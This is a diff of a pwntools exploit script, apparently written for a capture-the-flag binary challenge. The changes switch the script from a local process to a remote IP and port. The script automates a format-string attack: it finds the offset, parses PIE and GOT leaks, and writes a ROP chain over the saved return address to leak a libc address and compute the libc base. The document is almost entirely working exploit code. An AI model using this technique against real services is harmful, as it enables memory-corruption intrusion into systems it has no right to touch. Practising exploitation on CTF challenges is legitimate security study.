@@ -37,18 +37,6 @@ if(DEBUG):
 context.arch = "arm64"
 context.binary = elf
 
-def progEnv():
-    libc = ELF('/usr/lib64/ld-linux-x86-64.so.2')      # Use local libc library
-    return process(elf.path)                # Start a process to use ----> Used and can be stored in a variable
-    '''     COMMENTED OUT FOR NOW TO TEST LOCALLY
-    if args.LOCAL:
-        libc = ELF('/usr/lib/libc-2.33.so', checksec=False)
-        return process([elf.path])
-    else: runningProc.recvuntil('0x')
-        libc = ELF('./libc6_2.31-0ubuntu9.2_amd64.so', checksec=False)
-        return remote(HOST, PORT), libc
-    '''
-
 # Used by the autopwner as a callback function to find payload
 def exec_fmt(payload):
     p = process([elf.path])
@@ -59,10 +47,11 @@ def main():
     # Determine format string offset automatically --- pulled from CTF writeup, but prevents me from having to find the exact format
     autofmt = FmtStr(exec_fmt)
     offset = autofmt.offset
-    # log.info(f'Format string offset: {offset}')
 
     # start process
-    runningProc = progEnv()
+    # runningProc = process([elf.path])   # local running
+    runningProc = remote("165.22.46.243",8877)
+    libc = ELF("./libc.so.6")
 
     # Buffer length to smash, found in C code
     buffer = 0x150
@@ -77,28 +66,36 @@ def main():
     print("GOT LEAK: ", GOTLeak)        # Leak value check
     GOTLeakInt = int(GOTLeak, 16)
 
-    # Pull leak info for Main leak
+    # Pull leak info for Main leakThis stack leak might be useful
     runningProc.recvuntil(b"And this PIE leak might be useful ")
     PIELeak = runningProc.recvuntil(b"\n")
     print("PIE LEAK: ", PIELeak)        # Leak value check
     PIELeakInt = int(PIELeak, 16)
 
-    # Find base of main
+    # Find base of main by taking main addr - address in binary
     elf.address = PIELeakInt - elf.symbols.main
 
     # The offset to RIP is calculated as following
-    rip = GOTLeakInt + buffer + 8 # 8 = RBP length!
+    InstrPtr = GOTLeakInt + buffer + 8 # 8 = RBP length!
     
     # We make use of this useful gadget
     pop_rdi = elf.address + 0x00000000000012bb # pop rdi; ret;
 
     # This is the GOT leak location from above, want to call puts again to ensure next leak is called in ROP
     leak_func = 'setvbuf'
-    payload = fmtstr_payload(offset, {rip: pop_rdi, rip+8: elf.got[leak_func], rip+16: elf.symbols['puts'], rip+24: elf.symbols['main']}, write_size='short')
+    
+    # pretty much takes offset, then addes the rest of the functions to it
+    payload = fmtstr_payload(offset, {InstrPtr: pop_rdi, InstrPtr+8: elf.got[leak_func], InstrPtr+16: elf.symbols['puts'], InstrPtr+24: elf.symbols['main']}, write_size='short')
 
+    # Calculate libc leak
+    print("SENDING PAYLOAD 1")
     runningProc.sendline(payload)
-    resp=runningProc.recv()
-    print(resp)
+    runningProc.recvuntil('\x7f')   # Stop here to encapsulate data only required
+    # Following line from writeup --- attempted this my way and would always creash
+    libcLeak = u64(runningProc.recvuntil('\x7f').ljust(8, b'\x00'))  # Grab up to this byte, then grab until termination, tried this like above and wouldn't work
+    print("LIBC LEAK ADDR: ", libcLeak)
+    startLibc = libcLeak - libc.sym[leak_func]
+    print("START LIBC: ", hex(startLibc))
 
 
 # Execute the function main when written
